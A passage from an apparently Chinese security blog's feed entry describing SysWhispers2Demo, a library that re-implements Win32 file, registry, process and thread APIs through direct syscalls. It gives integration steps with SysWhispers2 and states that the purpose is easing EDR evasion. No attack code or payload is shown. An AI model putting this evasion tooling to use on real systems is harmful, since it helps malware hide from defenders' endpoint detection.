vs2017编译通过。其他未测。</p><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;在你使用SysWhispers2生成了文件之后，假设生成了文件是<code>syscall.c</code>,<code>syscall.h</code>，以及<code>syscall.asm</code>。</p><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;第一步，在生成的syscall.h文件中，删除所有的变量定义。因为SysWhispers2会生成变量定义，而SysWhispers2Demo也带有变量定义，两者会冲突。</p><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;第二歩，在生成的Syscall.h文件中，导入prototypes.h头文件。</p><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;第三歩，在SysWhispers2Demo库文件SysWhioers2Demo.c文件中，导入syscall.h头文件，目的是修改链接的Nt函数。</p><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;第四步，注释SysWhispers2Demo库文件SysWhioers2Demo.c文件中，指定函数的动态获取函数地址的语句。</p><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;除此以外，也可以选择直接Copy SysWhispers2Demo.cpp中，你想要使用的函数。 No Care！这应该是最容易的。</p><h2 id="0x03-版本信息"><a href="#0x03-版本信息" class="headerlink" title="0x03 版本信息"></a>0x03 版本信息</h2><h3 id="v0-1-0（2022-06-20）"><a href="#v0-1-0（2022-06-20）" class="headerlink" title="v0.1.0（2022-06-20）"></a>v0.1.0（2022-06-20）</h3><ul><li>初始版本，支持常见的文件，注册表，进程，线程 API操作。</li></ul><h2 id="0x04-协议"><a href="#0x04-协议" class="headerlink" title="0x04 协议"></a>0x04 协议</h2><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;直接用就是了。</p><h2 id="0x05-FAQ"><a href="#0x05-FAQ" class="headerlink" title="0x05 FAQ"></a>0x05 FAQ</h2><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;欢迎大家提PR</p><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;如果还有需要实现的kernel层API函数，或者bug，欢迎联系wanghacky@qq.com。</p>]]></content>
    
    <summary type="html">
    
      &lt;h2 id=&quot;0x00-项目简介&quot;&gt;&lt;a href=&quot;#0x00-项目简介&quot; class=&quot;headerlink&quot; title=&quot;0x00 项目简介&quot;&gt;&lt;/a&gt;0x00 项目简介&lt;/h2&gt;&lt;p&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;SysWhispers2Demo是通过逆向分析kernel32.dll或者kernelbase.dll文件，从而仿写部分Win32 API的实现逻辑，以解决部分SysWhispers2使用者在利用SysWhispers2做EDR规避时候所遇到的开发困难。SysWhispers2Demo在仿写Win32 API的时候，&lt;strong&gt;部分采用最小开发原则&lt;/strong&gt;，即部分参数需要使用微软API文档所约定的默认参数，以减轻仿写的工作量。项目地址:&lt;a href=&quot;https://github.com/findream/SysWhispers2Demo&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;https://github.com/findream/SysWhispers2Demo&lt;/a&gt;&lt;/p&gt;
    
    </summary>
    
      <category term="windows 攻防" scheme="https://findream.github.io/categories/windows-%E6%94%BB%E9%98%B2/"/>
    
    
  </entry>
  
</feed>
